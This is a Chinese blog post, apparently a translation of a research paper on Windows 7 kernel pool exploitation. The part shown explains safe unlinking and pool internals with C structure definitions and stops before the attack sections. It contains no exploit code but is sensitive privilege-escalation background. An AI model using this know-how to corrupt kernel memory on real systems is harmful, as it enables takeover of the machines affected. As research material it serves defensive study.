@@ -1,0 +1,993 @@
+
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/vendors/font-awesome/css/font-awesome.min.css?v=4.4.0" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.0.1" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="翻译," />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.0.1" />
+
+
+
+
+
+
+<meta name="description" content="在Windows 7中，Microsoft引入了安全的unlinking越来越多的影响Windows内核的安全公告。在从双向链接列表中删除条目之前，安全的unlinking旨在通过验证指向相邻列表条目的指针来检测内存损坏。因此，攻击者不能轻易地利用通用技术来利用池溢出或其他池损坏漏洞。在本文中，我们显示，尽管采取了安全措施，Windows 7仍然容易受到通用内核池攻击。特别地，我们显示，池分配器可">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Windows 7 内核池利用技术">
+<meta property="og:url" content="http://yoursite.com/2017/07/31/Windows-7-内核池利用技术/index.html">
+<meta property="og:site_name" content="hackyzh'blog">
+<meta property="og:description" content="在Windows 7中，Microsoft引入了安全的unlinking越来越多的影响Windows内核的安全公告。在从双向链接列表中删除条目之前，安全的unlinking旨在通过验证指向相邻列表条目的指针来检测内存损坏。因此，攻击者不能轻易地利用通用技术来利用池溢出或其他池损坏漏洞。在本文中，我们显示，尽管采取了安全措施，Windows 7仍然容易受到通用内核池攻击。特别地，我们显示，池分配器可">
+<meta property="og:image" content="http://yoursite.com/img/图一.png">
+<meta property="og:image" content="http://yoursite.com/img/图二.png">
+<meta property="og:image" content="http://yoursite.com/img/图三.png">
+<meta property="og:image" content="http://yoursite.com/img/图四.png">
+<meta property="og:image" content="http://yoursite.com/img/图五.png">
+<meta property="og:image" content="http://yoursite.com/img/图六.png">
+<meta property="og:image" content="http://yoursite.com/img/图七.png">
+<meta property="og:image" content="http://yoursite.com/img/图八.png">
+<meta property="og:updated_time" content="2017-07-31T11:17:19.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Windows 7 内核池利用技术">
+<meta name="twitter:description" content="在Windows 7中，Microsoft引入了安全的unlinking越来越多的影响Windows内核的安全公告。在从双向链接列表中删除条目之前，安全的unlinking旨在通过验证指向相邻列表条目的指针来检测内存损坏。因此，攻击者不能轻易地利用通用技术来利用池溢出或其他池损坏漏洞。在本文中，我们显示，尽管采取了安全措施，Windows 7仍然容易受到通用内核池攻击。特别地，我们显示，池分配器可">
+<meta name="twitter:image" content="http://yoursite.com/img/图一.png">
+
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    scheme: 'Pisces',
+    sidebar: {"position":"left","display":"post"},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: 1,
+      author: 'hackyzh'
+    }
+  };
+</script>
+
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2017/07/31/Windows-7-内核池利用技术/"/>
+
+  <title> Windows 7 内核池利用技术 | hackyzh'blog </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?657dfc0df5002745c7be83cc9e53b12d";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container one-collumn sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-meta ">
+  
+
+  <div class="custom-logo-site-title">
+    <a href="/"  class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <span class="site-title">hackyzh'blog</span>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+  <p class="site-subtitle"></p>
+</div>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup">
+ <span class="search-icon fa fa-search"></span>
+ <input type="text" id="local-search-input">
+ <div id="local-search-result"></div>
+ <span class="popup-btn-close">close</span>
+</div>
+
+
+    </div>
+  
+</nav>
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                Windows 7 内核池利用技术
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">发表于</span>
+            <time itemprop="dateCreated" datetime="2017-07-31T19:11:42+08:00" content="2017-07-31">
+              2017-07-31
+            </time>
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                &nbsp; | &nbsp;
+                <a href="/2017/07/31/Windows-7-内核池利用技术/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2017/07/31/Windows-7-内核池利用技术/" itemprop="commentsCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+
+          
+          
+
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>在Windows 7中，Microsoft引入了安全的unlinking越来越多的影响Windows内核的安全公告。在从双向链接列表中删除条目之前，安全的unlinking旨在通过验证指向相邻列表条目的指针来检测内存损坏。因此，攻击者不能轻易地利用通用技术来利用池溢出或其他池损坏漏洞。在本文中，我们显示，尽管采取了安全措施，Windows 7仍然容易受到通用内核池攻击。特别地，我们显示，池分配器可能在某些情况下无法安全地取消链接空闲列表条目，从而允许攻击者破坏任意内存。 为了阻止所提出的攻击，我们提出进一步加强和增强内核池安全性的方法。<br>Keywords: kernel pool, safe unlinking, exploitation</p>
+<h2 id="1、简介"><a href="#1、简介" class="headerlink" title="1、简介"></a>1、简介</h2><p>由于软件错误很难完全消除，由于现代计算的复杂性，供应商正在尽最大努力隔离和防止利用安全漏洞。诸如DEP和ASLR之类的缓解已经在当代操作系统中引入，以解决各种常用的开发技术。 但是，由于漏洞的缓解并不能解决安全漏洞的根本原因，因此总是存在边缘案例的情况。 例如，使用返回导向编程（ROP）[15]，单独的DEP很容易规避。此外，利用强大的应用程序嵌入式脚本引擎功能的新颖技术可能完全绕过DEP和ASLR [4]。</p>
+<p>利用缓解的补充方法是特权隔离。 通过使用操作系统的内置安全机制对用户和进程施加限制，攻击者无法轻松访问和操纵受管系统中的系统文件和注册表信息。由于在Vista中引入了用户帐户控制（UAC），默认情况下，用户不再运行具有管理权限的常规应用程序。 此外，现代浏览器[2]和文档读取器[13] [12]使用“沙盒”渲染过程来减少解析库和布局引擎中的安全漏洞的影响。 反过来，这也促使攻击者（以及研究人员）将精力集中在特权升级攻击上。 通过在最高特权环中执行任意代码，操作系统的安全性受到破坏。</p>
+<p>在大多数情况下，权限升级漏洞是由操作系统内核或第三方驱动程序中的错误引起的。许多缺陷源于动态分配的内核池内存的处理。内核池类似于用户模式的堆，并且多年来容易受到滥用双向链表的unlink操作的通用写入-4攻击[8] [16]。 为了应对越来越多的内核漏洞，微软在Windows7中引入了安全的unlinking[3]。安全的unlinking确保在双向链接空闲列表之间的相邻池块的指针在一个chunk被unlinked之前被验证。</p>
+<p>攻击者利用池损坏漏洞的目标是最终执行ring0中的任意代码。这通常以选定位置的任意内存写入或n字节损坏开始。在本文中，我们显示出尽管采取了安全措施，Windows 7中的内核池仍然容易受到generic1攻击。反过来，这些攻击可能允许攻击者完全危及操作系统内核。 我们还表示，设计用于修复write-4攻击的安全的unlinking可能在某些情况下无法实现其目标，并允许攻击者破坏任意内存。 为了阻止所提出的攻击，我们最终提出了进一步加强和增强内核池安全性的方法</p>
+<p>本文的其余部分安排如下。在第2节中，我们详细介绍了对Windows 7（和Vista）内核池的内部结构和更改。在第3节和第4节中，我们将讨论并展示影响Windows 7的实际内核池攻击。在第5节中，我们将讨论对策并提出加强内核池的方法。最后，在第6节中，我们提供了论文的结论。</p>
+<h2 id="2、内核池内部"><a href="#2、内核池内部" class="headerlink" title="2、内核池内部"></a>2、内核池内部</h2><p>在本节中，我们详细介绍了池内存池分配和释放中涉及的内核池管理结构和算法。了解内核池行为在正确评估其安全性和鲁棒性方面至关重要。为简洁起见，我们假设x86架构（32位）。 然而，大多数结构适用于AMD64 / x64（64位）。 第2.9节讨论了x86和x64架构之间内核池的显着差异。</p>
+<h3 id="2-1非均匀内存架构"><a href="#2-1非均匀内存架构" class="headerlink" title="2.1非均匀内存架构"></a>2.1非均匀内存架构</h3><p>对于每个新版本的Windows，内存管理器都得到增强，以更好地支持非均匀内存架构（NUMA），这是现代多处理器系统中使用的内存设计架构。NUMA将不同的内存库专用于不同的处理器，允许更快速地访问本地内存，而远程内存访问速度更慢。处理器和存储器被组合在一起，被称为节点的较小单元，由执行内核中的KNODE结构定义。</p>
+<p>————————————</p>
+<p>适用于任何n字节池腐败漏洞。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">typedef struct _KNODE</div><div class="line">&#123;</div><div class="line">/*0x000*/ union _SLIST_HEADER PagedPoolSListHead;</div><div class="line">/*0x008*/ union _SLIST_HEADER NonPagedPoolSListHead[3];</div><div class="line">/*0x020*/ struct _GROUP_AFFINITY Affinity;</div><div class="line">/*0x02C*/ ULONG32 ProximityId;</div><div class="line">/*0x030*/ UINT16 NodeNumber;</div><div class="line">/*0x032*/ UINT16 PrimaryNodeNumber;</div><div class="line">/*0x034*/ UINT8 MaximumProcessors;</div><div class="line">/*0x035*/ UINT8 Color;</div><div class="line">/*0x036*/ struct _flags Flags;</div><div class="line">/*0x037*/ UINT8 NodePad0;</div><div class="line">/*0x038*/ ULONG32 Seed;</div><div class="line">/*0x03C*/ ULONG32 MmShiftedColor;</div><div class="line">/*0x040*/ ULONG32 FreeCount[2];</div><div class="line">/*0x048*/ struct _CACHED_KSTACK_LIST CachedKernelStacks;</div><div class="line">/*0x060*/ LONG32 ParkLock;</div><div class="line">/*0x064*/ ULONG32 NodePad1;</div><div class="line">/*0x068*/ UINT8 _PADDING0_[0x18];</div><div class="line">&#125; KNODE, *PKNODE;</div></pre></td></tr></table></figure></p>
+<p>在多节点系统(nt!KeNumberNodes &gt; 1)上，内存管理器将总是尝试从理想的节点分配。因此，KNODE提供了有关在Color字段中找到本地内存的信息。 该值是由分配和自由算法用于将节点与其首选关联使用的数组索引池。此外，KNODE定义了四个单独链接的每个节点lookaside列表，用于空闲池页（在2.6节中讨论过）。</p>
+<h3 id="2-2、系统内存池"><a href="#2-2、系统内存池" class="headerlink" title="2.2、系统内存池"></a>2.2、系统内存池</h3><p>在系统初始化时，内存管理器根据系统节点的数量创建动态大小的内存池。 每个池由池描述符（第2.3节讨论）定义，一个跟踪池使用情况并定义池属性（如内存类型）的管理结构。有两种不同类型的池内存：paged和non-paged。</p>
+<p>分页池内存可以从任何进程上下文中分配和访问，但只能在IRQL &lt;DPC / dispatch级别进行访问。 使用的分页池数由nt！ExpNumberOfPagedPools给出。 在单处理器系统中，定义了四（4）个分页池描述符，由nt！ExpPagedPoolDescriptor数组中的索引1到4表示。 在多处理器系统上，每个节点定义一（1）个分页池描述符。 在这两种情况下，为原型池/全页分配定义了一个额外的页面池描述符，由nt!ExpPagedPoolDescriptor中的索引0表示。因此，在大多数桌面系统中，定义了五（5）个分页池描述符。</p>
+<p>非分页池内存始终保留在物理内存中。 这是IRQL&gt; = DPC / dispatch级别执行的线程（如中断处理程序）所必需的，因为页面错误不能及时满足。目前使用的非分页池的数量由nt！ExpNumberOfNonPagedPools给出。在单处理器系统上，nt!PoolVector数组的第一个索引指向非分页池描述符。在多处理器系统上，每个节点都有自己的非分页池描述符，由nt!ExpNonPagedPoolDescriptor数组索引</p>
+<p>此外，会话池内存（由win32k使用）用于会话空间分配，并且是每个用户会话唯一的。虽然非分页会话存储器使用全局非分页池描述符，但分页会话池内存具有在nt!MM SESSION SPACE中定义的其自己的池描述符。要获得会话池描述符，Windows 7会解析会话空间结构的相关联的nt！EPROCESS结构（当前正在执行的线程），然后找到嵌入的分页池描述符。</p>
+<h3 id="2-3-池描述符"><a href="#2-3-池描述符" class="headerlink" title="2.3 池描述符"></a>2.3 池描述符</h3><p>与用户模式堆很像，每个内核池都需要一个管理结构。 池描述符负责跟踪正在运行的分配数量，正在使用的页面以及有关池使用情况的其他信息。 它也有助于系统跟踪可重复使用的池块。 池描述符由以下结构（nt！POOL描述符）定义。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">typedef struct _POOL_DESCRIPTOR</div><div class="line">&#123;</div><div class="line">/*0x000*/ enum _POOL_TYPE PoolType;</div><div class="line">union &#123;</div><div class="line">/*0x004*/ struct _KGUARDED_MUTEX PagedLock;</div><div class="line">/*0x004*/ ULONG32 NonPagedLock;</div><div class="line">&#125;;</div><div class="line">/*0x040*/ LONG32 RunningAllocs;</div><div class="line">/*0x044*/ LONG32 RunningDeAllocs;</div><div class="line">/*0x048*/ LONG32 TotalBigPages;</div><div class="line">/*0x04C*/ LONG32 ThreadsProcessingDeferrals;</div><div class="line">/*0x050*/ ULONG32 TotalBytes;</div><div class="line">/*0x054*/ UINT8 _PADDING0_[0x2C];</div><div class="line">/*0x080*/ ULONG32 PoolIndex;</div><div class="line">/*0x084*/ UINT8 _PADDING1_[0x3C];</div><div class="line">/*0x0C0*/ LONG32 TotalPages;</div><div class="line">/*0x0C4*/ UINT8 _PADDING2_[0x3C];</div><div class="line">/*0x100*/ VOID** PendingFrees;</div><div class="line">/*0x104*/ LONG32 PendingFreeDepth;</div><div class="line">/*0x108*/ UINT8 _PADDING3_[0x38];</div><div class="line">/*0x140*/ struct _LIST_ENTRY ListHeads[512];</div><div class="line">&#125; POOL_DESCRIPTOR, *PPOOL_DESCRIPTOR;</div></pre></td></tr></table></figure>
+<p>池描述符包含内存管理器使用的几个重要列表。PendingFrees指出的延迟空闲列表是一个等待被释放池块的单向列表。在第2.8节中有详细的解释。ListHeads是一系列相同大小的释放池块的双向链表。 与延迟的空闲列表不同，ListHeads列表中的块已经被释放，并且可以由内存管理器随时分配。 我们在下面的部分讨论ListHeads</p>
+<h3 id="2-4-ListHeads列表（空闲列表）"><a href="#2-4-ListHeads列表（空闲列表）" class="headerlink" title="2.4 ListHeads列表（空闲列表）"></a>2.4 ListHeads列表（空闲列表）</h3><p>ListHeads列表或空闲列表以8字节粒度的大小排序，用于高达4080字节的分配。空闲块按照块大小索引到ListHeads数组中，计算为所请求的字节数，舍入为8的倍数，除以8，或BlockSize =（NumberOfBytes + 0xF）&gt;&gt; 3。执行舍入以保留 池标题的空间，在所有池块之前的结构。 在x86 Windows上，池标题定义如下。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">typedef struct _POOL_HEADER</div><div class="line">&#123;</div><div class="line">union &#123;</div><div class="line">struct &#123;</div><div class="line">/*0x000*/ UINT16 PreviousSize : 9;</div><div class="line">/*0x000*/ UINT16 PoolIndex : 7;</div><div class="line">/*0x002*/ UINT16 BlockSize : 9;</div><div class="line">/*0x002*/ UINT16 PoolType : 7;</div><div class="line">&#125;;</div><div class="line">/*0x000*/ ULONG32 Ulong1;</div><div class="line">&#125;;</div><div class="line">union &#123;</div><div class="line">/*0x004*/ ULONG32 PoolTag;</div><div class="line">struct &#123;</div><div class="line">/*0x004*/ UINT16 AllocatorBackTraceIndex;</div><div class="line">/*0x006*/ UINT16 PoolTagHash;</div><div class="line">&#125;;</div><div class="line">&#125;;</div><div class="line">&#125; POOL_HEADER, *PPOOL_HEADER;</div></pre></td></tr></table></figure></p>
+<p>池头保存分配所需的信息和自由算法正常运行。 PreviousSize表示前一个池块的块大小。 由于内存管理器总是尝试通过合并边界空闲块来减少碎片，因此通常用于定位前一个块的池头。 PreviousSize也可以为零，在这种情况下，池块位于池页面的开头</p>
+<p>PoolIndex将索引提供到关联的池描述符数组中，例如nt!ExpPagedPoolDescriptor。 它被释放算法用于确保<br>池块被释放到适当的池描述符ListHeads。在3.4节中，我们展示了攻击者如何破坏此值，以便将池头损坏（如池溢出）扩展为任意内存损坏</p>
+<p>如其名称所示，PoolType定义了一个块的池类型。但是，它也表明一个块是忙还是空闲。 如果一个块是空闲的，则PoolType设置为零。另一方面，如果某个块正忙，则将PoolType设置为其描述符的池类型（POOL TYPE枚举中的值，如下所示）与使用池中的位掩码进行“或”对齐。 此位掩码在Vista及更高版本中设置为2，而XP/2003则设置为4。 例如。 对于Vista和Windows 7上的一个繁忙的分页池块，PoolType = PagedPool | 2 = 3。</p>
+<hr>
+<p>2 如果请求的字节超过4080，则不能使用剩余的页面片段</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">typedef enum _POOL_TYPE</div><div class="line">&#123;</div><div class="line">NonPagedPool = 0 /*0x0*/,</div><div class="line">PagedPool = 1 /*0x1*/,</div><div class="line">NonPagedPoolMustSucceed = 2 /*0x2*/,</div><div class="line">DontUseThisType = 3 /*0x3*/,</div><div class="line">NonPagedPoolCacheAligned = 4 /*0x4*/,</div><div class="line">PagedPoolCacheAligned = 5 /*0x5*/,</div><div class="line">NonPagedPoolCacheAlignedMustS = 6 /*0x6*/,</div><div class="line">MaxPoolType = 7 /*0x7*/,</div><div class="line">NonPagedPoolSession = 32 /*0x20*/,</div><div class="line">PagedPoolSession = 33 /*0x21*/,</div><div class="line">NonPagedPoolMustSucceedSession = 34 /*0x22*/,</div><div class="line">DontUseThisTypeSession = 35 /*0x23*/,</div><div class="line">NonPagedPoolCacheAlignedSession = 36 /*0x24*/,</div><div class="line">PagedPoolCacheAlignedSession = 37 /*0x25*/,</div><div class="line">NonPagedPoolCacheAlignedMustSSession = 38 /*0x26*/</div><div class="line">&#125; POOL_TYPE, *PPOOL_TYPE;</div></pre></td></tr></table></figure>
+<p>如果一个池块是免费的，并且在ListHeads列表中，则它的池标头是立即是LIST ENTRY结构。因此，ListHead不保持单个块大小（8字节）的块，因为它们不够大以容纳结构。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">typedef struct _LIST_ENTRY</div><div class="line">&#123;</div><div class="line">/*0x000*/ struct _LIST_ENTRY* Flink;</div><div class="line">/*0x004*/ struct _LIST_ENTRY* Blink;</div><div class="line">&#125; LIST_ENTRY, *PLIST_ENTRY;</div></pre></td></tr></table></figure>
+<p>LIST ENTRY结构用于连接双列列表中的池块。<br>历史上，它一直是在用户模式堆[5]和内核池[8] [16]中利用内存损坏漏洞的目标，主要是由于众所周知的“”write-4”利用技术。 LIST ENTRY攻击用户模式堆与Windows XP SP2的发布[5]，同样在内核池与Windows 7 [3]。</p>
+<h3 id="2-5-Lookaside表"><a href="#2-5-Lookaside表" class="headerlink" title="2.5 Lookaside表"></a>2.5 Lookaside表</h3><p>内核使用快速单向列表（LIFO）来更快地分配和释放小池块。它们旨在以高度并发的代码运行，并在添加和删除条目时使用原子比较和交换指令。为了更好地利用CPU缓存，在处理器控制块（KPRCB）中，每个处理器定义了后备列表。KPRCB结构保存了分页（PPPagedLookasideList）和非分页（PPNPagedLookasideList）分配的lookaside表，以及用于经常请求的固定大小分配（如I / O请求数据包和内存描述符列表）的特殊专用lookaside表（PPLookasideList）。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">typedef struct _KPRCB</div><div class="line">&#123;</div><div class="line">...</div><div class="line">/*0x5A0*/ struct _PP_LOOKASIDE_LIST PPLookasideList[16];</div><div class="line">/*0x620*/ struct _GENERAL_LOOKASIDE_POOL PPNPagedLookasideList[32];</div><div class="line">/*0xF20*/ struct _GENERAL_LOOKASIDE_POOL PPPagedLookasideList[32];</div><div class="line">...</div><div class="line">&#125; KPRCB, *PKPRCB;</div></pre></td></tr></table></figure></p>
+<p>对于分页和未分页的后备列表，最大块大小为0x20。<br>因此，每种类型有32个独特的lookaside列表。 每个lookaside表由GENERAL LOOKASIDE POOL结构定义，如下所示。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div></pre></td><td class="code"><pre><div class="line">typedef struct _GENERAL_LOOKASIDE_POOL</div><div class="line">&#123;</div><div class="line">union</div><div class="line">&#123;</div><div class="line">/*0x000*/ union _SLIST_HEADER ListHead;</div><div class="line">/*0x000*/ struct _SINGLE_LIST_ENTRY SingleListHead;</div><div class="line">&#125;;</div><div class="line">/*0x008*/ UINT16 Depth;</div><div class="line">/*0x00A*/ UINT16 MaximumDepth;</div><div class="line">/*0x00C*/ ULONG32 TotalAllocates;</div><div class="line">union</div><div class="line">&#123;</div><div class="line">/*0x010*/ ULONG32 AllocateMisses;</div><div class="line">/*0x010*/ ULONG32 AllocateHits;</div><div class="line">&#125;;</div><div class="line">/*0x014*/ ULONG32 TotalFrees;</div><div class="line">union</div><div class="line">&#123;</div><div class="line">/*0x018*/ ULONG32 FreeMisses;</div><div class="line">/*0x018*/ ULONG32 FreeHits;</div><div class="line">&#125;;</div><div class="line">/*0x01C*/ enum _POOL_TYPE Type;</div><div class="line">/*0x020*/ ULONG32 Tag;</div><div class="line">/*0x024*/ ULONG32 Size;</div><div class="line">union</div><div class="line">&#123;</div><div class="line">/*0x028*/ PVOID AllocateEx;</div><div class="line">/*0x028*/ PVOID Allocate;</div><div class="line">&#125;;</div><div class="line">union</div><div class="line">&#123;</div><div class="line">/*0x02C*/ PVOID FreeEx;</div><div class="line">/*0x02C*/ PVOID Free;</div><div class="line">&#125;;</div><div class="line">/*0x030*/ struct _LIST_ENTRY ListEntry;</div><div class="line">/*0x038*/ ULONG32 LastTotalAllocates;</div><div class="line">union</div><div class="line">&#123;</div><div class="line">/*0x03C*/ ULONG32 LastAllocateMisses;</div><div class="line">/*0x03C*/ ULONG32 LastAllocateHits;</div><div class="line">&#125;;</div><div class="line">/*0x040*/ ULONG32 Future[2];</div><div class="line">&#125; GENERAL_LOOKASIDE_POOL, *PGENERAL_LOOKASIDE_POOL;</div></pre></td></tr></table></figure>
+<p>在此结构中，SingleListHead.Next指向单向lookside表上的第一个空闲池块。lookaside表的大小受深度值的限制，由余额集管理器4根据lookaside表中的命中和未命中数量定期调整。 因此，经常使用的lookaside将具有比不经常使用的lookaside表更大的深度值。</p>
+<p>会话池也定义了lookaside表。 分页会话池分配使用在会话空间中定义的单独的lookaside表（nt!ExpSessionPoolLookaside）。每个会话lookaside表的最大块大小为0x19，由nt!ExpSessionPoolSmallLists设置。 会话池lookaside表使用GENERAL LOOKASIDE结构，与GENERAL LOOKASIDE POOL相同，但带有额外的填充。 对于非分页会话池分配，使用以前讨论的非分页每处理器lookaside表。</p>
+<p>如果设置了热/冷页分离池标志（nt!ExpPoolFlags＆0x100），则池块的后备列表将被禁用。标志在系统启动期间设置，以提高速度并减少内存占用。定时器（在nt!ExpBootFinishedTimer中设置）在引导后2分钟关闭热/冷页分离。</p>
+<p>2.6 大池分配</p>
+<p>池描述符ListHeads维护小于一页的块。 大于4080字节（需要一页或多页）的池分配由nt!ExpAllocateBigPool处理。反过来，这个函数调用nt！MiAllocatePoolPages，池页分配器，它将请求的大小舍入到最接近的页面大小。 块大小1和前一大小0的“Frag”块立即放置在大池分配之后，以便池分配器可以利用剩余的页面片段。 然后将多余的字节放回适当的池描述符ListHeads列表的尾部。</p>
+<p>从2.1节回顾，每个节点（由KNODE定义）具有与它们相关联的4个单向链接的lookaside表。 这些列表由池页面分配器在快速处理小页面计数的请求中使用。对于分页内存，KNODE为单页分配定义了一个lookaside表（PagedPoolSListHead）。对于非分页分配，定义页数1,2和3的后备列表（NonPagedPoolSListHead [3]）。 池页面lookaside表的大小由系统中存在的物理页数确定。</p>
+<p>如果不能使用lookaside表，则使用分配位图来获取所请求的池页面。 位图（在RTL BITMAP中定义）是一个位数组，指示哪些内存页面正在使用，并为每个主要池类型创建。它将搜索保存所请求的未使用页数的第一个索引。对于分页池 ，位图在MM PAGED POOL INFO结构中定义，由nt!MmPagedPoolInfo指向。对于非分页池，位图由nt!MiNonPagedPoolBitMap指向。对于会话池，位图在MM SESSION SPACE结构中定义。</p>
+<p>对于大多数大型池分配，nt！ExAllocatePoolWithTag将请求一个额外的4个字节（x64上的8个）以将分配大小存储在池主体的末尾。 随后在分配器被释放时（在ExFreePoolWithTag中）检查该值以捕获可能的池溢出。</p>
